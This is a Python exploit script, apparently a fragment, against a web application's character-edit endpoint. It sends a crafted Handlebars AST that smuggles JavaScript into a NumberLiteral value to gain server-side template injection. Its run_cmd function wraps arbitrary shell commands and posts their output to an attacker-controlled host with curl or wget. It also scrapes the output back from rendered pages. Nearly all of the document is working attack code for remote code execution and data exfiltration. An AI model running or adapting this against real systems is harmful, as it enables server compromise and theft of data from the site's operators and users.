def make_ast(expr):
    value = "{},{})) + " + expr + " //"

    return {
        "type": "Program",
        "body": [
            {
                "type": "MustacheStatement",
                "path": {
                    "type": "PathExpression",
                    "data": False,
                    "depth": 0,
                    "parts": ["lookup"],
                    "original": "lookup",
                    "loc": None
                },
                "params": [
                    {
                        "type": "StringLiteral",
                        "value": "a",
                        "original": "a",
                        "loc": None
                    },
                    {
                        "type": "NumberLiteral",
                        "value": value,
                        "original": 1,
                        "loc": None
                    }
                ],
                "escaped": True,
                "strip": {"open": False, "close": False},
                "loc": None
            }
        ]
    }


def post_ast(session, args, expr):
    csrf = get_csrf(session, args)

    if not csrf:
        return None, None

    url = args.target.rstrip("/") + f"/character/{args.character_id}"

    headers = {
        "Referer": args.target.rstrip("/") + f"/character/{args.character_id}/edit",
        "Content-Type": "application/json"
    }

    payload = {
        "_csrf": csrf,
        "name": args.name,
        "race": args.race,
        "class": args.char_class,
        "backstory": args.backstory,
        "campaign_message": make_ast(expr)
    }

    try:
        r = session.post(
            url,
            json=payload,
            headers=headers,
            allow_redirects=True,
            timeout=args.timeout,
            verify=False,
            proxies=PROXIES
        )
    except Exception as e:
        print(f"[-] POST failed: {e}")
        return None, payload

    if r.status_code == 403:
        csrf = get_csrf(session, args, force=True)

        if csrf:
            payload["_csrf"] = csrf

            try:
                r = session.post(
                    url,
                    json=payload,
                    headers=headers,
                    allow_redirects=True,
                    timeout=args.timeout,
                    verify=False,
                    proxies=PROXIES
                )
            except Exception as e:
                print(f"[-] POST retry failed: {e}")
                return None, payload

    return r, payload


def fetch_pages(session, args):
    paths = [
        "/",
        f"/campaign/{args.campaign_id}",
        f"/character/{args.character_id}",
        f"/character/{args.character_id}/edit"
    ]

    out = []

    for path in paths:
        try:
            url = args.target.rstrip("/") + path
            url += ("?" if "?" not in url else "&") + "z=" + rand_marker("Z")

            r = session.get(
                url,
                timeout=args.timeout,
                verify=False,
                proxies=PROXIES
            )

            out.append((path, r.text))

        except Exception as e:
            out.append((path, f"ERROR {e}"))

    return out


def save_debug(name, payload, pages):
    os.makedirs(DEBUGDIR, exist_ok=True)
    fname = os.path.join(DEBUGDIR, name + ".html")

    combined = "### PAYLOAD\n"
    combined += json.dumps(payload, indent=2)
    combined += "\n\n"

    for source, body in pages:
        combined += f"### SOURCE: {source}\n{body}\n\n"

    with open(fname, "w", encoding="utf-8", errors="ignore") as f:
        f.write(combined)

    return fname


def extract_token_block(text, token):
    un = html.unescape(text)

    matches = re.findall(
        re.escape(token) + r"(.*?)" + re.escape(token),
        un,
        re.S | re.I
    )

    if matches:
        return clean(matches[-1], 4000)

    return None


def find_term(pages, terms):
    for source, text in pages:
        un = html.unescape(text)

        for term in terms:
            if term in un:
                return clean(around(un, term), 3000), source, term

    return None, None, None


def run_expr(session, args, name, expr, terms):
    print(f"\n[*] {name} :: sending AST expression")

    r, payload = post_ast(session, args, expr)

    if not r:
        print(f"[-] {name} :: no response")
        return False

    time.sleep(args.delay)

    pages = [(f"POST_FINAL {r.status_code} {r.url}", r.text)]
    pages += fetch_pages(session, args)

    fname = save_debug(name, payload, pages)

    snippet, source, term = find_term(pages, terms)

    if snippet:
        print(f"[+] {name} :: http={r.status_code} term={term} source={source} file={fname}")
        print(f"    snippet: {snippet[:1600]}")
        return True

    print(f"[-] {name} :: http={r.status_code} file={fname}")
    return False


def run_cmd(session, args, name, cmd):
    token = rand_marker("T")

    shell = (
        "D=/dev/shm; [ -w \"$D\" ] || D=/tmp; "
        f"F=\"$D/{token}\"; "
        f"echo {token}; "
        f"({cmd}) > \"$F\" 2>&1; "
        "head -c 900 \"$F\"; "
        f"echo {token}; "
        f"curl -s --max-time 8 -X POST --data-binary @\"$F\" http://{args.lhost}:{args.http_port}/{token} "
        f"|| wget -q --timeout=8 --post-file=\"$F\" http://{args.lhost}:{args.http_port}/{token} "
        "|| true"
    )

    expr = inject_shell(shell)

    print(f"\n[*] {name} :: {cmd[:120]}")

    r, payload = post_ast(session, args, expr)

    if not r:
        print(f"[-] {name} :: no response")
        return False

    time.sleep(args.delay)

    pages = [(f"POST_FINAL {r.status_code} {r.url}", r.text)]
    pages += fetch_pages(session, args)

    fname = save_debug(name, payload, pages)

    block = None

    for source, text in pages:
        block = extract_token_block(text, token)
        if block:
            break

    exfil_file = wait_exfil(token, timeout=8)

    print(f"[*] {name} :: http={r.status_code} debug={fname}")

    if exfil_file:
        try:
            with open(exfil_file, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()

            print(f"[+] {name} :: exfil saved -> {exfil_file} ({len(content)} bytes)")
            print("---- OUTPUT ----")
            print(content[:8000])
            print("---- END ----")

        except Exception as e:
            print(f"[-] {name} :: could not read exfil file: {e}")

    elif block:
        print(f"[+] {name} :: web output only")
        print("---- WEB OUTPUT ----")
        print(block[:8000])
        print("---- END ----")

    else:
        print(f"[-] {name} :: no output captured")

    return bool(exfil_file or block)


